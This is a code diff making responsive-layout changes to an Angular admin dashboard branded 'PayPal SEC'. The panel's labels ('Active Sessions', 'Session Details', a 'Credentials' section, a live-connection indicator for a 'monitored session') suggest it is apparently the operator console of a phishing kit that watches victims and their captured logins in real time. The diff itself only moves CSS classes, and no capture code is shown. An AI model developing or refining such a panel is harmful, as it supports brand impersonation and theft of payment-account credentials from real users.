@@ -11,7 +11,7 @@ type AdminTab = 'live' | 'history' | 'settings';
   standalone: true,
   imports: [CommonModule, FormsModule],
   template: `
-    <div class="flex h-screen flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy overflow-hidden">
+    <div class="flex flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy min-h-screen lg:h-screen lg:overflow-hidden">
       
       <!-- Toast Notification -->
       @if (state.adminToast()) {
@@ -47,7 +47,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       } @else {
 
       <!-- SIDEBAR -->
-      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
+      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0 sticky top-0 lg:static">
            <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
            </div>
@@ -84,7 +84,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       </aside>
 
       <!-- MAIN CONTENT -->
-      <main class="flex-1 flex flex-col h-[calc(100vh-64px)] lg:h-screen relative bg-pp-bg overflow-hidden">
+      <main class="flex-1 flex flex-col relative bg-pp-bg min-h-0 lg:h-full lg:overflow-hidden">
          
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white border-b border-slate-200 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
@@ -105,7 +105,9 @@ type AdminTab = 'live' | 'history' | 'settings';
          </header>
 
          <!-- Content Area -->
-         <div class="flex-1 overflow-hidden relative">
+         <!-- Mobile: Grows naturally (min-h-0 is default for flex items but we want flow here) -->
+         <!-- Desktop: Restricted height to trigger scroll -->
+         <div class="w-full flex-1 lg:overflow-hidden relative flex flex-col">
             
             @switch (activeTab()) {
                 
@@ -113,7 +115,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                 @case ('live') {
                     <div class="flex flex-col lg:flex-row h-full">
                         
-                        <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
+                        <!-- List Column -->
+                        <!-- Mobile: Fixed height scrollable area or natural? Let's use fixed height for list so it doesn't push details too far down -->
                         <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
@@ -150,11 +153,13 @@ type AdminTab = 'live' | 'history' | 'settings';
                              </div>
                         </div>
 
-                        <!-- Details Column (Flexible, Independent Scroll) -->
-                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] relative">
+                        <!-- Details Column -->
+                        <!-- Mobile: Flows naturally with window scroll. sticky header. -->
+                        <!-- Desktop: Overflow-y-auto independently. -->
+                        <div class="flex-1 flex flex-col lg:h-full lg:overflow-hidden bg-[#F9FAFB] relative min-h-[500px] lg:min-h-0">
                              @if(monitoredSession()) {
-                                 <!-- Header (Sticky) -->
-                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm">
+                                 <!-- Header -->
+                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm sticky top-0 lg:static">
                                      <div>
                                          <div class="flex items-center gap-3 mb-1">
                                             <h2 class="font-bold text-lg lg:text-xl text-pp-navy">Session Details</h2>
@@ -174,7 +179,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
                                  
                                  <!-- Scrollable Content -->
-                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
+                                 <div class="flex-1 lg:overflow-y-auto p-4 lg:p-8 pb-32 lg:pb-32">
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                          
                                          <!-- Credentials -->
@@ -294,7 +299,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
 
                                  <!-- Action Bar (Sticky Bottom) -->
-                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
+                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm fixed bottom-0 left-0 right-0 lg:absolute lg:bottom-0 z-20 flex justify-between items-center shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)]">
                                      <div class="flex items-center gap-2">
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
@@ -332,7 +337,9 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- HISTORY TAB -->
                 @case ('history') {
-                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden h-full flex flex-col">
+                    <!-- Desktop: Fixed height with internal scroll -->
+                    <!-- Mobile: Natural scroll -->
+                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden lg:h-full flex flex-col h-[600px]">
                         <div class="px-8 py-6 border-b border-slate-100">
                             <h3 class="font-bold text-lg text-pp-navy">Session History</h3>
                         </div>
